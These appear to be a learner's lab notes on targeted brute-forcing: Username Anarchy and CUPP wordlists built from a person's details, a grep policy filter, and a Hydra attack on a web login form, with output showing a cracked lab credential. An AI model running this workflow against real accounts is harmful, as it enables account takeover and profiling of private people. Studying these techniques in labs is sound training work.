# Custom wordlist:
While pre-made wordlist rockyou or Seclists provide respository of potential pass and usernames, they operates on a broad spectrum. casting a wide net in the hopes
of catching the right combinations. While effective in some scenarios, this approach can inefficient and time-consuming, especially when targeting specific
individual or organization with unique pass or user patter.
Consider the scenario where penstester  attempts to compromise the account of [Thomas Edison] at his workplace. A generic username list like [xato-net-19-million-usernams-dup.txt]
is unlikely to yield any meaningful results. Given potential user conventions enforced  by his company, the probability of his specific username begin included in such maissive
dataset is minimal. These could range from a straightfoward first name/lastname format to more intricate combinations like last/first three.

The power of custom comes into play, meticulosly crafted lists, tailored to the specific targeted and their enviroment, dramatically increase brute-force attack's effectively and success rate.

## Username Anarchy:
Even when dealing with a seemingly simple name like "Jane Smith", manual username generation can quicky become a convoluted endeavor. The obvius combinations like jane,smith,janesmith.smith or jane.s may seem
adequate, they barely scratch the surface of the potential username landscape.
Creativity knows no bounds, and username often become a canvas for personal expression, Jane could seamlessly weave in her middle name, or cherished hobby, leading to variations like janemarie, smithj87 or
jane_the_gardener. The allure of leetspeak, where letters are replace with number and symbols, could manifest in username like j4n3, 5m1th, or j@n3_5m1th.
Or the passion for particular book, movie, or band might inspire username like winteriscoming, potterheadjane, or smith_beathle_fan.

This is where username Anarchy shines. Common substituations, adn more casting wider net in ur quest to uncover the target:
`./user-anaechiy -l`
First at all we must install ruby then pull the username anarchy git to get the script:

After install execute the program with the target;s first and last name. This will generatee possible username combination.
```sh
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_username.txt
jane
janesmith
jane.smith
janesmit
janes
j.smith
jsmith
sjane
s.jane
smithj
smith
smith.j
smith.jane
js
```
## CUPP
With the username aspect addressed, the next formidable hundle in a brute-force attack is the pass. This is where CUPP steps in, a tool designed to create highly
personalized pass wordlist the leverage the gathered intellenge about the target.
Our exploration with Jane Smith, already employed username Anarchy to generate a list of potential username. CUPP to comploment this with a targeted pass list.
The efficacy of CUPP hinges on the quality and depth of the indromation u feed it, akin to a detective piecing together a suspect's profile.
Wher can ine gather this value intelligence for a target like smith.
- Social media
- Company Website
- Public Records
- New Articles and Blogs

Installation the CUPP:
`sudo pacman -S cupp`
`cupp -i`
We now have generated usename.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible pass for us, odd pass policy:
   - Minimum Length: 6 characters
   - Must Include:
        - At least one uppercase letter
        - At least one lowercase letter
        - At least one number
        - At least two special characters (from the set !@#$%^&*)

Command grep to filter that pass list to match that policy:
`grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt`
This command efficiently filters jane.txt to match the provided policy form 4600 pass to posible. Ensures a minumun lenth of 6 charachers, then checks for at least
on upperletter, one lowercase letter, one number, and finally, at least two special characters form the specified set.
`hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"`
We can use cupp to create the wordlist:
```sh
cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```
Fileter the jane.txt
with grep:
`grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt`
Now we generate the [jane-filtered.txt] and now we can use hydra for get the pass:
```sh
 hydra -L ~/TOOLS/username-anarchy/jane_smith_username.txt -P jane-filtered.txt 83.136.254.202 -s 49373 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-23 11:27:09
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100604 login tries (l:14/p:7186), ~6288 tries per task
[DATA] attacking http-post-form://83.136.254.202:49373/:username=^USER^&password=^PASS^:Invalid credentials
[49373][http-post-form] host: 83.136.254.202   login: jane   password: 3n4J!!
[STATUS] attack finished for 83.136.254.202 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-23 11:27:20
```
We can use the generate list of usernames that we did with [username-anarchy]
`./username-anarchy Jane Smith > jane_smith_username.txt`

[[49373][http-post-form] host: 83.136.254.202   login: jane   password: 3n4J!!]

